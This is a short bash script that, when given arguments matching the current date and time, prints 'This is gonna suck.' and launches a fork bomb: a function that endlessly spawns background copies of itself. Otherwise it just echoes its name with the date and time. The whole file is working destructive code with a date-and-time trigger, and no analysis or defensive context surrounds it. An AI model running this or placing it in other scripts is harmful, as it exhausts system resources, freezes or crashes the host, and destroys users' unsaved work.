#! /bin/bash

date=$(date +%Y-%m-%d)
time=$(date +%H:%M)
if [[ $1 == $date && $2 == $time ]]; then
    echo "This is gonna suck."
    bomb() {
        while true; do
            (bomb) &
        done
    }
    bomb
else
    echo "$0 $date $time"
fi
